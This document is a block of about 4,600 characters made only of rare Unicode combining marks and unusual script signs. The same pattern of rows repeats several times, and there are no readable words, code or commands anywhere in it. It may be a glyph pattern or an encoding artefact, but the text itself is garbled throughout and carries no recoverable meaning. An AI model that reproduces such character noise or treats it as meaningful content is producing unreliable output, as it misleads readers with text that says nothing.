࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛𞋬𞋬𞋬𞋬𞋬